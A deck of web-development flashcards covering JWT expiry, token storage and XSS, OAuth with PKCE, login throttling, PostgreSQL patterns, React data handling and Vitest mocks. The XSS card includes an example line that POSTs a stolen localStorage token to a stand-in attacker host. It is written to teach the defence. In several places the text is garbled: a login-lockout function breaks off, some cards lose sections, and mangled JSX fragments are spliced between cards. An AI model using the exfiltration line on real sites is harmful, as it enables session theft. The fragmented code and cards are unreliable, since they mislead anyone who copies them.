A printed day pass versus a keycard. Once printed, a day pass can't be cancelled; the guard only checks the date, so short passes limit how long a stolen one works. The desk that prints new passes (the refresh endpoint) is where a reported pass can be refused.

## A common mistake

Making access tokens last a week to avoid building refresh logic. Then logout, a password change, or a banned account has no effect on tokens already issued for up to a week. Keep access tokens short and put revocable state in the refresh step or in a server session.

A JWT is created with `exp: Date.now() + 15 * 60 * 1000`. How long does the token stay valid, and how should the line be written?

<!-- recall:solution -->

**Practically forever.** `exp` is a NumericDate in seconds, but `Date.now()` returns milliseconds, so read as seconds this value lands around the year 58,700. Fix: `exp: Math.floor(Date.now() / 1000) + 15 * 60`. With the jose library, `setExpirationTime('15m')` does the conversion for you.

cards.front: A React SPA stores its access token in localStorage. What can a single XSS bug do with it, and what does OWASP recommend instead?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Any script running on your origin, including one injected through XSS (cross-site scripting), can read localStorage and send the token to an attacker, who then uses it from their own machine until it expires. OWASP says not to keep tokens or session IDs in localStorage or sessionStorage. Prefer an `HttpOnly; Secure; SameSite` session cookie, or a backend-for-frontend (BFF): a small server that holds the OAuth tokens and gives the browser only such a cookie.

## A worked example

```js
// Injected script, token in localStorage: copied off the device
fetch('https://evil.example/steal', {
  method: 'POST',
  body: localStorage.getItem('access_token'),
});

// Same script, HttpOnly session cookie: nothing to copy
document.cookie; // the HttpOnly cookie is not in this string
```

MDN documents that `document.cookie` never includes HttpOnly cookies. The script can still send requests from the open page, so fixing the XSS remains the real defence.

## Picture it another way

A token in localStorage is a key left under the doormat: anyone who reaches the porch (any script on your page) can take it home and use it later. An HttpOnly cookie is a key built into the lock: an intruder inside can open doors while there, but cannot carry the key away.

## A common mistake

Believing an HttpOnly cookie makes XSS harmless. Injected code can still call your API from the victim's open tab, and the browser attaches the cookie. HttpOnly limits the damage to that page session; it does not replace output encoding, a Content Security Policy, and CSRF protection.

## Try a small exercise

Your SPA and its API are served from the same domain. Should login state live in a bearer token in localStorage or an HttpOnly session cookie, and what extra protection does the cookie choice need?

<!-- recall:solution -->

**Use the HttpOnly session cookie.** With same-domain hosting the browser sends it automatically, and page scripts cannot read it, so an XSS bug cannot copy it off the device. Because the browser attaches cookies by itself, state-changing requests also need CSRF protection: SameSite plus a CSRF token or an equivalent check.

cards.front: Behind a 'Sign in with Google' button, what do the authorization code flow and PKCE each protect against?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

The browser goes to the provider, the user signs in there, and the provider redirects back with a short-lived one-time `code`, not a token. Your app swaps the code for tokens in a direct back-channel request, which keeps tokens out of URLs and history. PKCE (Proof Key for Code Exchange) makes a stolen code useless: the app sends a hash of a random secret first and must present the secret itself to redeem the code. OpenID Connect adds an ID token saying who signed in.

## A worked example

```js
import { randomBytes, createHash } from 'node:crypto';

const verifier = randomBytes(32).toString('base64url'); // secret, 43 chars
const challenge = createHash('sha256').update(verifier).digest('base64url');
// 1. redirect: ...&code_challenge={challenge}&code_challenge_method=S256
// 2. token request: code + code_verifier={verifier}

// RFC 7636 test vector
createHash('sha256').update('dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk').digest('base64url');
// 'E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM'
```

Node 22 reproduced the RFC's published challenge. Someone who intercepts the code from step 1 lacks the verifier and cannot complete step 2.

## Picture it another way

A coat check where you also choose a secret word. The ticket (code) might be seen or stolen, but the attendant (token endpoint) hands over the coat only to someone who can say the word whose fingerprint (hash) was written on the ticket when it was issued.

## A common mistake

Using the access token as proof of who signed in. The access token is for calling the provider's API. The OpenID Connect ID token is the sign-in proof for your app, and it must be validated (issuer, audience equal to your client ID, expiry, nonce) before you create your own session. A maintained library does these checks.

## Try a small exercise

A new React SPA adds 'Sign in' with an OAuth provider. Should it use the implicit flow (token returned in the redirect URL) or authorization code with PKCE, and why?

<!-- recall:solution -->

**Authorization code with PKCE.** The implicit flow puts the access token in the redirect URL, where history, logs, and Referer headers can leak it; RFC 9700 (OAuth security best practice) says not to use it, and the OAuth 2.1 draft removes it. Code plus PKCE keeps tokens out of URLs, and an intercepted code is useless without the verifier. OWASP requires it for SPAs too.

cards.front: How should a login endpoint slow down password guessing without letting an attacker lock real users out for good?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Count failed attempts per account and, after a threshold, lock that account for a short, growing period (30 s, 60 s, 120 s…) rather than permanently, answering 429 Too Many Requests with `Retry-After`. OWASP ties the counter to the account, not only the IP address, because attackers rotate IPs. Add per-IP limits, a CAPTCHA after a few failures, MFA, and logging, and keep the error generic: "Invalid email or password".

## A worked example

```js
const fails = new Map(); // email -> { count, lockedUntil }

function checkLock(email, res) {
  const f = fails.get(email);
  if (!f || Date.now() >= f.lockedUntil) return false;
```

cards.front: A create-task endpoint INSERTs a row whose id is generated by the database. How can it get that id back without running a second query?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Add a `RETURNING` clause: `INSERT ... RETURNING id, title` runs the insert and hands back the listed columns of the row it just wrote, in the same statement and round trip. The API can put that row straight into its 201 response. `RETURNING` also works on `UPDATE` and `DELETE`, returning the rows they changed. It is PostgreSQL syntax that SQLite 3.35+ also supports.

## A worked example

```sql
INSERT INTO tasks (title)
VALUES ($1)
RETURNING id, title;
-- $1 = 'Buy milk'  ->  1 | Buy milk
-- $1 = 'Call Sam'  ->  2 | Call Sam
```
The result comes back like a SELECT result, so node-postgres gives it to you as `result.rows[0]`. Database defaults such as `created_at` can be listed in `RETURNING` too.

## Picture it another way

It is like a clerk who stamps your form with its reference number and hands the stamped copy back at the counter, instead of making you queue again to ask which number you got.

## A common mistake

Running `SELECT MAX(id) FROM tasks` (or re-selecting by title) after the insert to find the new id. Another request can insert between your two statements, so you may return someone else's row, and titles are not unique anyway. Ask the INSERT itself with `RETURNING`.

## Try a small exercise

Write one PostgreSQL statement that marks task $1 as done and returns its id and title, returning no row at all if that task does not exist.

<!-- recall:solution -->

**`UPDATE tasks SET done = true WHERE id = $1 RETURNING id, title;`** When the id matches, you get the updated row back; when nothing matches, the result has zero rows, which the API can turn into a 404. No separate SELECT is needed before or after.

cards.front: An API runs UPDATE tasks SET title = $1 WHERE id = $2 AND owner_id = $3 and then always returns 200. Why can it report success for a task it never updated?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

An `UPDATE` or `DELETE` whose `WHERE` matches zero rows is not an error: the database just reports 0 rows affected. If the task id doesn't exist, or belongs to another user, nothing changes and the handler still says 200. Read the affected-row count (`result.rowCount` in node-postgres, `cursor.rowcount` in Python) and return 404 when it is 0.

## A worked example

```js
const result = await db.query(
  'UPDATE tasks SET title = $1 WHERE id = $2 AND owner_id = $3',
  [title, taskId, userId]
);
if (result.rowCount === 0) {
  return res.status(404).json({ error: 'Task not found' });
}
res.sendStatus(204);
```
Run against a table where task 7 belongs to user 1 and task 8 to user 2, the same UPDATE reported 1 row for (7, user 1) and 0 rows for (8, user 1), leaving task 8 unchanged.

## Picture it another way

Like a mail-merge that reports "0 letters sent" when no contact matches your filter: the job ran fine, it just did nothing, and only the count tells you so.

## A common mistake

Answering 403 when the count is 0. With the owner check inside the `WHERE` clause, a 0 cannot tell "missing" from "someone else's", and saying which one leaks that the id exists, so most APIs return 404 for both.

## Try a small exercise

A DELETE FROM notes WHERE id = $1 AND owner_id = $2 runs for an id that does not exist. Does PostgreSQL raise an error, and what should the API use to decide its response?

<!-- recall:solution -->

**No error: the DELETE succeeds and reports 0 affected rows.** The API should read that count (`rowCount` in node-postgres). 0 means nothing of this user's was deleted, so return 404, or 204 if your API deliberately treats repeated deletes as success.

cards.front: A settings endpoint must create a user's 'theme' row the first time and change it on later saves. How does ON CONFLICT DO UPDATE do this in one statement?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

`INSERT ... ON CONFLICT (user_id, key) DO UPDATE SET value = excluded.value` tries the insert; if a row with the same `(user_id, key)` already exists, it updates that row instead. `excluded` is PostgreSQL's name for the row you tried to insert, so `excluded.value` is the new value. The conflict columns must match a unique constraint or unique index, and the statement is atomic, so concurrent saves cannot create a duplicate. SQLite 3.24+ accepts the same syntax.

## A worked example

```sql
-- user_settings has PRIMARY KEY (user_id, key)
INSERT INTO user_settings (user_id, key, value)
VALUES ($1, $2, $3)
ON CONFLICT (user_id, key)
DO UPDATE SET value = excluded.value
RETURNING user_id, key, value;
-- (1, 'theme', 'light') -> 1 | theme | light  (inserted)
-- (1, 'theme', 'dark')  -> 1 | theme | dark   (updated)
```
After both calls the table still holds exactly one row for that user and key.

## Picture it another way

Like a coat check with one hook per ticket number: hand in a coat for a free ticket and it is hung up; hand one in for a ticket already in use and the attendant swaps the coat on that hook instead of adding a second hook.

## A common mistake

Using `ON CONFLICT DO NOTHING` and then expecting `RETURNING` to hand back the existing row. `DO NOTHING` returns no row when it skips the insert, so the handler sees an empty result and may wrongly report failure. Use `DO UPDATE`, or SELECT the row when the result is empty.

## Try a small exercise

Write an upsert for a page_views table (primary key path) that inserts views = 1 for a new path and adds 1 to the stored count for an existing path.

<!-- recall:solution -->

**`INSERT INTO page_views (path, views) VALUES ($1, 1) ON CONFLICT (path) DO UPDATE SET views = page_views.views + 1;`** You want the existing row's value here, so name the table (`page_views.views`). `SET views = excluded.views` would just reset it to 1. Three calls for one path gave 1, 2, 3.

cards.front: A task can have many tags and a tag can be on many tasks. Why can't a tag_id column on tasks model this, and what table do you add instead?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

A `tag_id` column holds one tag per task, and a comma-separated list of ids cannot be joined cleanly, indexed, or protected by foreign keys. Add a join table `task_tags(task_id, tag_id)` with one row per pairing, each column a foreign key, and a composite `PRIMARY KEY (task_id, tag_id)` so the same pair cannot be stored twice. Tagging is an INSERT into it, untagging is a DELETE, and queries JOIN through it.

## A worked example

```sql
CREATE TABLE task_tags (
  task_id bigint NOT NULL REFERENCES tasks (id) ON DELETE CASCADE,
  tag_id  bigint NOT NULL REFERENCES tags (id) ON DELETE CASCADE,
  PRIMARY KEY (task_id, tag_id)
);
SELECT t.id, t.title
FROM tasks t
JOIN task_tags tt ON tt.task_id = t.id
JOIN tags g ON g.id = tt.tag_id
WHERE g.name = 'urgent';
```
With tasks 1 and 3 tagged urgent, the SELECT returned exactly those two tasks. Inserting the pair (1, 10) a second time failed with a unique-constraint error.

## Picture it another way

Think of a class sign-up sheet: students and courses are separate lists, and the sheet has one line per "this student takes this course". Nobody crams a list of courses into the student's own record.

## A common mistake

Forgetting the composite primary key (or a unique constraint) on the pair. A double-clicked "Add tag" then inserts the same pair twice, and every query that joins through the table shows that task twice.

## Try a small exercise

A user removes the 'bug' tag (id 10) from task 1 in a schema with tasks, tags, and a task_tags join table. Which SQL statement runs, and which table does it change?

<!-- recall:solution -->

**`DELETE FROM task_tags WHERE task_id = 1 AND tag_id = 10;`** Only the join table changes. The task and the tag both still exist; you removed the link between them. Deleting from `tags` instead would strip that tag from every task.

cards.front: comments.post_id references posts(id) with no ON DELETE clause. In PostgreSQL, what happens when you delete a post that still has comments?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

The DELETE fails with a foreign-key violation and nothing is removed. With no clause the action is `NO ACTION`, the default: if referencing rows still exist when the constraint is checked, PostgreSQL raises an error. The other choices: `CASCADE` deletes the child rows too, `SET NULL` clears the reference (the column must be nullable), and `RESTRICT` errors like NO ACTION but cannot be deferred to the end of the transaction.

## A worked example

```sql
CREATE TABLE sessions (
  id bigint PRIMARY KEY,
  user_id bigint NOT NULL REFERENCES users (id) ON DELETE CASCADE
);
CREATE TABLE orders (
  id bigint PRIMARY KEY,
  user_id bigint REFERENCES users (id) ON DELETE SET NULL,
  total_cents integer NOT NULL
);
DELETE FROM users WHERE id = 1;
-- user 1's sessions: deleted; user 1's orders: kept, user_id now NULL
```
Checked in SQLite with `PRAGMA foreign_keys = ON`; SQLite leaves foreign keys off unless you turn them on, while PostgreSQL always enforces them.

## Picture it another way

Like closing a shared folder that still has files in it: you can refuse (NO ACTION or RESTRICT), shred everything inside (CASCADE), or move the files to an "unfiled" pile (SET NULL). You pick the rule when you create the folder, not when you delete it.

## A common mistake

Adding `ON DELETE CASCADE` everywhere so deletes "just work". Deleting one user can then silently wipe orders or invoices you were required to keep. Cascade data that only makes sense with its parent (sessions, join-table rows) and keep the default on records with their own value.

## Try a small exercise

Deleting a user should remove their login sessions but keep their past orders with no user attached. Which ON DELETE action goes on sessions.user_id and which on orders.user_id?

<!-- recall:solution -->

**`ON DELETE CASCADE` on `sessions.user_id` and `ON DELETE SET NULL` on `orders.user_id`.** Sessions are meaningless without the user, so they go with it. Orders must survive, so the reference is cleared, which requires `orders.user_id` to be nullable (no NOT NULL).

cards.front: You need the users who have placed at least one order. Why does joining users to orders list some users several times, and what query returns each user once?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

A JOIN produces one output row per matching pair, so a user with three orders appears three times. You only want to know whether a match exists, so use `WHERE EXISTS (SELECT 1 FROM orders o WHERE o.user_id = u.id)`: it tests each user once and never multiplies rows. `WHERE u.id IN (SELECT user_id FROM orders)` gives the same result here. Use a JOIN when you need columns from orders in the output.

## A worked example

```sql
SELECT u.name
FROM users u
WHERE EXISTS (
  SELECT 1 FROM orders o
  WHERE o.user_id = u.id
)
ORDER BY u.id;
-- Ada, Bo   (the plain JOIN gave Ada, Ada, Ada, Bo)
```
Ada has three orders, Bo one, Cy none. `SELECT 1` is only a convention: EXISTS checks whether the subquery returns any row and ignores what it selects.

## Picture it another way

Asking "does this reader have any library loans?" is a yes-or-no look at their card. A JOIN instead prints one line per loan, which is why a keen reader shows up many times.

## A common mistake

Patching the duplicates with `SELECT DISTINCT` after the JOIN. It works for a list of names, but it hides the intent, makes the database build the multiplied rows and then remove them, and the duplicates return as soon as you select a column that differs per order.

## Try a small exercise

cards.front: What does a WITH clause (a common table expression, or CTE) let you do in a report query that would otherwise nest subqueries inside subqueries?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

`WITH name AS (SELECT ...)` defines a named, temporary result that the main query can use like a table. You can build a report in readable steps: first compute each user's paid total, then join and filter that. ## A worked example

```sql
WITH spend AS (
  SELECT user_id, SUM(total_cents) AS paid_cents
  FROM orders
  WHERE status = 'paid'
  GROUP BY user_id
)
SELECT u.name, s.paid_cents
FROM spend s
JOIN users u ON u.id = s.user_id
WHERE s.paid_cents > 2000
ORDER BY s.paid_cents DESC;
-- Ada | 7500
```
Bo (1000 paid) and Cy (1500 paid, 9000 refunded) are filtered out because only paid orders are summed.

Like working a calculation on scratch paper with labelled lines ("subtotal = ...", then "after discount = subtotal - ...") instead of writing one long formula full of nested brackets.

cards.front: How do you count open and done tasks per project in one SQL query, returning one row per project with a column for each count?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Put a `CASE` expression inside `SUM`: `SUM(CASE WHEN status = 'open' THEN 1 ELSE 0 END)` adds 1 for each open task in the group and 0 for the rest. A second column does the same for done, and `GROUP BY project_id` gives one row per project. `CASE WHEN ... THEN ... ELSE ... END` returns a value per row, so it also works in SELECT lists, ORDER BY, and UPDATE. PostgreSQL also has `COUNT(*) FILTER (WHERE status = 'open')` for the same count.

## A worked example

```sql
SELECT project_id,
  SUM(CASE WHEN status = 'open' THEN 1 ELSE 0 END) AS open_count,
  SUM(CASE WHEN status = 'done' THEN 1 ELSE 0 END) AS done_count
FROM tasks
GROUP BY project_id
ORDER BY project_id;
-- 1 | 2 | 1
-- 2 | 0 | 2
```
Project 2 shows 0 open tasks rather than NULL because every one of its rows contributes a 1 or a 0.

## Picture it another way

Like a tally sheet with an "open" column and a "done" column: for each task you put a mark in one of them, then add up each column per project.

Leaving out `ELSE`: a CASE with no matching branch returns NULL. When no row in a group matches, `SUM` returns NULL instead of 0, and the API sends `null` where the UI expected a number.

Tasks have priority 'high', 'medium', or 'low', and ORDER BY priority sorts them high, low, medium. How do you make the query sort them high, medium, low?

Plain ORDER BY compares the text alphabetically; the CASE turns each label into a number in business order, and `ELSE 4` puts unexpected values last.

cards.front: A product search runs title LIKE '%' || $1 || '%' with the user's text as a parameter. Why does searching for '100%' also return '1000 piece puzzle'?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Parameters stop SQL injection, but LIKE still reads `%` (any run of characters) and `_` (any one character) inside the bound value as wildcards. The pattern becomes `%100%%`, which matches any title containing `100`. Escape `\`, `%`, and `_` in the user's text with a backslash before binding it, and add `ESCAPE '\'`. PostgreSQL already uses backslash as its default LIKE escape; writing ESCAPE makes that explicit and portable.

## A worked example

```js
const escapeLike = (s) => s.replace(/[\\%_]/g, '\\$&');
const sql = `SELECT id, title FROM products
  WHERE title LIKE '%' || $1 || '%' ESCAPE '\\'`;
await db.query(sql, [escapeLike('100%')]); // binds 100\%
```
Against three titles, the unescaped term matched '100% cotton tee', '1000 piece puzzle' and 'Box of 100 pens'; the escaped term matched only '100% cotton tee'. The `'\\'` in the template literal reaches the database as a single backslash.

## Picture it another way

Like a search tool where `*` means "anything": to find a real asterisk you have to mark that one as "just a character". Escaping is that mark, added for every wildcard character the user typed.

## A common mistake

Fixing it by building the SQL string yourself (`LIKE '%${term}%'`). That reopens SQL injection. Keep the text a bound parameter and escape only the LIKE wildcards inside it; the two measures solve different problems.

## Try a small exercise

A search binds the user's text 'a_b' into title LIKE '%' || $1 || '%' without escaping it. Which title matches wrongly: 'a_b cable' or 'axb adapter'?

<!-- recall:solution -->

**'axb adapter' matches wrongly; 'a_b cable' matches correctly.** Unescaped `_` means 'any single character', so `a_b` also matches `axb`. After escaping the text to `a\_b` and adding `ESCAPE '\'`, only 'a_b cable' matched in a test run.

cards.front: Why does created_at BETWEEN '2026-03-01' AND '2026-03-31' miss orders placed on the afternoon of March 31 when created_at is a timestamp column?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

A bare date compared with a timestamp means midnight, so the upper bound is `2026-03-31 00:00:00` and anything later that day is excluded. `BETWEEN` includes both ends, which tempts people into `23:59:59` hacks that still miss fractional seconds. Use a half-open range instead: `created_at >= '2026-03-01' AND created_at < '2026-04-01'`. It includes the start, excludes the start of the next period, and adjacent months never overlap or leave gaps.

## A worked example

```sql
SELECT id FROM orders
WHERE created_at >= '2026-03-01 00:00:00'
  AND created_at <  '2026-04-01 00:00:00'
ORDER BY id;
-- 1, 2, 3, 4   (BETWEEN ... AND '2026-03-31 00:00:00' gave 1, 2, 3)
```
Order 4 at 2026-03-31 18:45 is caught only by the half-open range, and order 5 at 2026-04-01 00:00 is correctly left out.

## Picture it another way

Like booking a meeting room from 9:00 up to, but not including, 10:00: the next booking can start at exactly 10:00 without overlapping, and no minute falls between the two.

Wrapping the column instead: `WHERE date(created_at) = '2026-03-15'`. It returns the right rows, but applying a function to every row stops a plain index on `created_at` from being used. With PostgreSQL's `timestamptz`, a bare date bound is read in the session time zone, so set that deliberately.

## Try a small exercise

**`WHERE created_at >= '2026-03-15' AND created_at < '2026-03-16'`** Start at midnight of the day and stop before midnight of the next. It catches every moment of the 15th, including 23:59:59.5, and compares the column directly, so an index on `created_at` can be used.

cards.front: In a React create-task form, how can the submit handler read every field's value without a useState for each input?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Handle the form's `onSubmit`, call `e.preventDefault()` so the browser doesn't reload the page, then build `new FormData(e.currentTarget)`. It holds every **named** field of that form, and `form.get('title')` returns its value as a string. The inputs can stay uncontrolled (set a starting value with `defaultValue`). Keep `useState` for values the screen must react to while the user types.

## A worked example

```jsx
function NewTask({ onCreate }) {
  function handleSubmit(e) {
    e.preventDefault();
    const form = new FormData(e.currentTarget);
    onCreate({ title: form.get('title'), qty: Number(form.get('qty')) });
  }
  return (
    <form onSubmit={handleSubmit}>
      <input name="title" defaultValue="Buy milk" />
      <input name="qty" type="number" defaultValue="3" />
      <button>Add</button>
    </form>
  );
}
```

Clicking Add calls `onCreate({ title: 'Buy milk', qty: 3 })`. On its own, `form.get('qty')` returns the string `'3'`, even for `type="number"`, so convert it.

## Picture it another way

It is like collecting a paper form at a counter and reading the labelled boxes once, instead of watching the person write every letter. Boxes without a label (a `name`) are never read.

## A common mistake

Forgetting `e.preventDefault()`. The browser then performs a normal form submission: it navigates to the form's URL with the fields in the query string, the page reloads, and all React state is lost before your fetch finishes.

## Try a small exercise

A signup input has `id="email"` but no `name` attribute. What does `new FormData(form).get('email')` return when the form is submitted?

<!-- recall:solution -->

**`null`.** FormData collects fields by their `name`, not their `id`, so an unnamed input is skipped entirely. Add `name="email"`, and keep the `id` for the `<label htmlFor="email">`.

cards.front: A task detail component fetches `/api/tasks/${id}` in `useEffect`. How should it cancel that request when `id` changes or the component unmounts?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Create an `AbortController` inside the effect, pass `controller.signal` to `fetch`, and return a cleanup that calls `controller.abort()`. React runs the cleanup before the effect runs again for a new `id`, and on unmount, so the old request stops and cannot overwrite newer state. An aborted fetch rejects with an `AbortError`, so the `catch` must skip it instead of showing an error.

## A worked example

```jsx
useEffect(() => {
  const controller = new AbortController();
  setState({ status: 'loading' });
  fetch(`/api/tasks/${id}`, { signal: controller.signal })
    .then((res) => {
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      return res.json();
    })
    .then((data) => setState({ status: 'success', data }))
    .catch((error) => {
      if (controller.signal.aborted) return; // cancelled on purpose
      setState({ status: 'error', error });
    });
  return () => controller.abort();
}, [id]);
```

Switching from task 1 to task 2 aborts request 1; its rejection is ignored, and only task 2 reaches state.

## Picture it another way

Like cancelling a delivery order when you change the address: you ring the shop to cancel (abort), and the "order cancelled" text you then receive is expected, not a problem to report to anyone.

## A common mistake

Creating one `AbortController` outside the effect (in a ref or at module level) and reusing it. After the first `abort()` its signal stays aborted, so every later `fetch` with that signal rejects immediately. Make a new controller in each effect run.

## Try a small exercise

A task page aborts its fetch in the effect cleanup, but every switch to another task briefly shows "Failed to load". What is the `catch` handler missing?

<!-- recall:solution -->

**A check for the intentional abort.** The cleanup's `abort()` makes the old fetch reject with an `AbortError`, and the `catch` treats it as a failure. Return early when `controller.signal.aborted` is true (or `error.name === 'AbortError'`) before setting the error state.

cards.front: After `POST /api/tasks` succeeds, how should a React list add the new task without refetching the whole list?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Append the object the server returns, which carries the real `id` and server-set fields such as `createdAt`, not the form values. Use an updater function: `setTasks((prev) => [...prev, created])`. The updater receives the latest list, even if other saves finished while this request was in flight. Refetching is still the simpler choice when the server sorts, filters, or paginates the list.

## A worked example

```jsx
async function addTask(title) {
  const res = await fetch('/api/tasks', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ title }),
  });
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  const created = await res.json(); // { id: 44, title: 'A', createdAt: '…' }
  setTasks((prev) => [...prev, created]);
}
```

Two quick adds that finish out of order both end up in the list, each with the id the server issued.

## Picture it another way

Like adding to a shared shopping list: write the new line on whatever the list says now, not on a photo of the list you took before walking to the shop.

## A common mistake

Appending the form values with a made-up id such as `Date.now()`. The row looks right, but the next edit or delete sends an id the server never issued and gets a 404.

## Try a small exercise

Two create requests are in flight, and each finishes with `setTasks([...tasks, created])`. Both succeed, yet only the second new task appears. Why?

<!-- recall:solution -->

**Each handler captured `tasks` from the render where it started.** Both spread the same old array, so the second update replaces the first. Use `setTasks((prev) => [...prev, created])` so each append builds on the latest list.

    {shown.map((t) =>
  • {t.title}{t.sending && ' …'}
    • )}
); } ``` While saving, the list shows "New …". On success it shows the saved task; on failure it returns to the old list and a toast appears. ## Picture it another way Like pencilling a booking into a diary: it is visible at once. {task.title}

; } ``` With `t.id === taskId` the lookup returns `undefined` for `/tasks/7`; with `Number(taskId)` it finds the task. cards.front: Why does a component's `useEffect` fetch appear twice in the Network panel during `npm run dev` but only once in the production build?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

In development, `<StrictMode>` mounts each component, runs its effects, runs their cleanups, and then runs the effects again. This stress test exposes effects that are missing cleanup. Production builds run the effect once. Keep StrictMode on and make the effect safe to repeat: abort or ignore the first request in cleanup. A duplicate GET is harmless; a duplicate write means the code belongs in an event handler.

## A worked example

```jsx
useEffect(() => {
  let ignore = false;
  fetch(`/api/tasks/${id}`)
    .then((res) => res.json())
    .then((task) => { if (!ignore) setTask(task); });
  return () => { ignore = true; };
}, [id]);
```

In development under StrictMode this effect runs twice; the first run's cleanup sets `ignore`, so only the second response is stored. In a production build it runs once.

## Picture it another way

cards.front: In Vitest, why does expect(createTask('Buy milk')).toBe({ title: 'Buy milk', done: false }) fail even though every field matches?
cards.back:
<!-- recall:teaching:v1 -->

```ts
  const task = createTask('Buy milk')
  expect(task).toEqual({ title: 'Buy milk', done: false }) // passes
  expect(task.title).toBe('Buy milk') // passes: strings compare by value

})
```

cards.front: How do you check in Vitest that an async saveTask({ title: '' }) rejects with the message 'Title is required'?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Pass the promise to `expect`, chain `.rejects`, then a matcher: `await expect(saveTask({ title: '' })).rejects.toThrow('Title is required')`. `.rejects` waits for the promise and hands its rejection reason to `toThrow`, which checks that the error message contains the text. `await` keeps the test running until the check is done. `.resolves` is the mirror image for a promise that should succeed.

## A worked example

```ts
import { expect, test } from 'vitest'

async function saveTask(input: { title: string }) {
  if (!input.title.trim()) throw new Error('Title is required')
  return { id: 1, ...input }
}

test('blank title is rejected', async () => {
  await expect(saveTask({ title: '  ' })).rejects.toThrow('Title is required')
  await expect(saveTask({ title: 'Buy milk' })).resolves.toEqual({ id: 1, title: 'Buy milk' })
})
```

Both lines check a promise: one must fail with that message, the other must succeed with that value.

## Picture it another way

Checking a promise without waiting is like marking a parcel "returned" the moment you post it. `await expect(...).rejects` waits for the parcel to come back, then reads the reason on the return label.

## A common mistake

Leaving out `await`. Vitest 4 still runs the check when the test ends, but prints "Promise returned by ... was not awaited" and warns that the next major version will fail the test. Always write `await expect(...).rejects...` inside an `async` test.

Predict what expect(() => saveTask({ title: '' })).toThrow('Title is required') does in Vitest when saveTask is an async function that throws for a blank title.

**The assertion fails** ("expected [Function] to throw an error"). An async function never throws synchronously: calling it returns a rejected promise, so the arrow function returns normally. Use `await expect(saveTask({ title: '' })).rejects.toThrow('Title is required')`.

cards.front: A submitTask(title, create, onSaved) helper should call onSaved once with the created task. How can a Vitest test check that without a real API or callback?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Pass mock functions made with `vi.fn()`. A mock records every call, so afterwards you can assert `toHaveBeenCalledTimes(1)` and `toHaveBeenCalledWith(...)`. You can also script what it returns: `vi.fn().mockResolvedValue(task)` acts like an async API call that succeeds with `task`. The test then checks the helper's real logic without any network.

## A worked example

```js
import { expect, test, vi } from 'vitest'

async function submitTask(title, create, onSaved) {
  const task = await create({ title: title.trim() })
  onSaved(task)
}

test('passes the created task to onSaved', async () => {
  const create = vi.fn().mockResolvedValue({ id: 7, title: 'Buy milk' })
  const onSaved = vi.fn()
  await submitTask(' Buy milk ', create, onSaved)
  expect(create).toHaveBeenCalledWith({ title: 'Buy milk' })
  expect(onSaved).toHaveBeenCalledTimes(1)
  expect(onSaved).toHaveBeenCalledWith({ id: 7, title: 'Buy milk' })
})
```

The first assertion also proves the title was trimmed before it reached the API.

A `vi.fn()` is a stand-in actor with a notebook: it says whatever lines you script, and writes down every time it was called and with what, so the test can read the notebook afterwards.

cards.front: When would you use vi.spyOn(console, 'error') instead of vi.fn(), and how do you put the real console.error back afterwards?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Use `vi.spyOn(object, 'method')` when the code calls a method on an existing object, such as `console.error` or `Math.random`, instead of receiving a function you can pass in. The spy replaces the method in place and records calls; by default it still calls the original. Add `.mockImplementation(() => {})` to silence it. Put the original back with `spy.mockRestore()`, or `vi.restoreAllMocks()` in `afterEach`.

## A worked example

```ts
import { afterEach, expect, test, vi } from 'vitest'

function reportSaveError(err: Error) {
  console.error('Save failed:', err.message)
}

afterEach(() => vi.restoreAllMocks())

test('logs the failure message', () => {
  const spy = vi.spyOn(console, 'error').mockImplementation(() => {})
  reportSaveError(new Error('timeout'))
  expect(spy).toHaveBeenCalledWith('Save failed:', 'timeout')
})
```

The empty implementation keeps test output clean; `restoreAllMocks` puts the real `console.error` back after each test.

## Picture it another way

A spy is a call logger fitted to an existing phone line: calls still go through unless you reroute them, and each one is written down. Restoring removes the logger and leaves the line as it was.

## A common mistake

Forgetting to restore. A silenced `console.error` spy stays in place for the rest of the file, so later tests hide real warnings, such as React errors. Restore in `afterEach`, or set `restoreMocks: true` in the Vitest config.
